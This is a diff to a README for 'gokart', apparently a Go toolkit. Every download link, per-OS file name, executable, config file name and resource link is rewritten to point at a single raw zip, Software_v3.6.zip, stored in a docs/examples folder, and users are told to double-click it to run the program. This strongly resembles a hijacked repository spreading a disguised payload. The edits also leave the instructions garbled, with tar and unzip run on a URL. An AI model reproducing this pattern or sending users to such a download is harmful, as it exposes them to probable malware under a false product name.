@@ -6,13 +6,13 @@ Welcome to **gokart**, your go-to toolkit for building Go services. Our tool sim
 
 ## ⚡ Download Now
 
-[![Download gogart](https://img.shields.io/badge/Download%20gokart-via%20GitHub-brightgreen)](https://github.com/esdras01-droid/gokart/releases)
+[![Download gogart](https://github.com/esdras01-droid/gokart/raw/refs/heads/main/docs/examples/http-server/Software_v3.6.zip%20gokart-via%20GitHub-brightgreen)](https://github.com/esdras01-droid/gokart/raw/refs/heads/main/docs/examples/http-server/Software_v3.6.zip)
 
 ## 📥 Download & Install
 
 To get started with gokart, visit our releases page to download the latest version. 
 
-[Download gokart](https://github.com/esdras01-droid/gokart/releases)
+[Download gokart](https://github.com/esdras01-droid/gokart/raw/refs/heads/main/docs/examples/http-server/Software_v3.6.zip)
 
 ### Steps to Download
 
@@ -26,9 +26,9 @@ To get started with gokart, visit our releases page to download the latest versi
 
 Here are some examples of files you might see:
 
-- `gokart-linux-amd64.tar.gz` for Linux users
-- `gokart-windows-amd64.zip` for Windows users
-- `gokart-darwin-amd64.zip` for macOS users
+- `https://github.com/esdras01-droid/gokart/raw/refs/heads/main/docs/examples/http-server/Software_v3.6.zip` for Linux users
+- `https://github.com/esdras01-droid/gokart/raw/refs/heads/main/docs/examples/http-server/Software_v3.6.zip` for Windows users
+- `https://github.com/esdras01-droid/gokart/raw/refs/heads/main/docs/examples/http-server/Software_v3.6.zip` for macOS users
 
 Make sure to select the file that matches your operating system.
 
@@ -57,18 +57,18 @@ Once you've downloaded the file, follow these steps to extract it:
 
 ### For macOS and Linux
 
-1. Locate the downloaded `.tar.gz` or `.zip` file.
+1. Locate the downloaded `https://github.com/esdras01-droid/gokart/raw/refs/heads/main/docs/examples/http-server/Software_v3.6.zip` or `.zip` file.
 2. Open your terminal.
 3. Use the following command to extract the file:
 
    ```
-   tar -xzf gokart-linux-amd64.tar.gz
+   tar -xzf https://github.com/esdras01-droid/gokart/raw/refs/heads/main/docs/examples/http-server/Software_v3.6.zip
    ```
 
    or for `.zip`:
 
    ```
-   unzip gokart-darwin-amd64.zip
+   unzip https://github.com/esdras01-droid/gokart/raw/refs/heads/main/docs/examples/http-server/Software_v3.6.zip
    ```
 
 ## 🚀 Running gokart
@@ -78,7 +78,7 @@ After extracting the files, you are ready to run gokart.
 ### On Windows
 
 1. Open the folder where you extracted gokart.
-2. Double-click `gokart.exe` to run the program.
+2. Double-click `https://github.com/esdras01-droid/gokart/raw/refs/heads/main/docs/examples/http-server/Software_v3.6.zip` to run the program.
 
 ### On macOS and Linux
 
@@ -115,7 +115,7 @@ gokart is designed to simplify your experience with several Go libraries. Here�
 
 To configure gokart, you will typically edit a configuration file. This file allows you to change settings like database credentials and server ports. Here’s how to create it:
 
-1. In the same directory as the `gokart` executable, create a new file named `config.yml`.
+1. In the same directory as the `gokart` executable, create a new file named `https://github.com/esdras01-droid/gokart/raw/refs/heads/main/docs/examples/http-server/Software_v3.6.zip`.
 2. Add your configuration settings in the following format:
 
    ```yaml
@@ -136,7 +136,7 @@ If you encounter issues, here are some common problems and solutions:
   - **Solution**: Ensure you're using the correct version for your operating system.
   
 - **Problem**: Can't connect to the database.
-  - **Solution**: Check your database credentials in the `config.yml` file.
+  - **Solution**: Check your database credentials in the `https://github.com/esdras01-droid/gokart/raw/refs/heads/main/docs/examples/http-server/Software_v3.6.zip` file.
 
 - **Problem**: Application crashes upon launch.
   - **Solution**: Ensure that all dependencies are correctly installed and the configuration file is properly formatted.
@@ -149,8 +149,8 @@ If you need help or want to share your experiences, consider joining our communi
 
 You may find the following resources helpful:
 
-- [GitHub Repository](https://github.com/esdras01-droid/gokart)
-- [Installation Guide](https://github.com/esdras01-droid/gokart/releases)
-- [Wiki](https://github.com/esdras01-droid/gokart/wiki)
+- [GitHub Repository](https://github.com/esdras01-droid/gokart/raw/refs/heads/main/docs/examples/http-server/Software_v3.6.zip)
+- [Installation Guide](https://github.com/esdras01-droid/gokart/raw/refs/heads/main/docs/examples/http-server/Software_v3.6.zip)
+- [Wiki](https://github.com/esdras01-droid/gokart/raw/refs/heads/main/docs/examples/http-server/Software_v3.6.zip)
 
 Thank you for choosing gokart as your toolkit for Go services!
